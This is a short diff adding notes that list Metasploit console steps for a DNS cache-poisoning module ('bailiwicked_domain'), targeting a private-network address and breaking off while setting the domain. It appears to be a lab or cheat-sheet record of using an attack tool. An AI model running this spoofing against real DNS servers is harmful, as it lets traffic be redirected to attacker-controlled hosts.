@@ -1,0 +1,7 @@
+###	auxiliary/spoof/dns/bailiwicked_domain
+
+1]	use auxiliary/spoof/dns/bailiwicked_domain
+
+2]	set RHOST 192.168.20.2
+
+3]	set DOMAIN spr
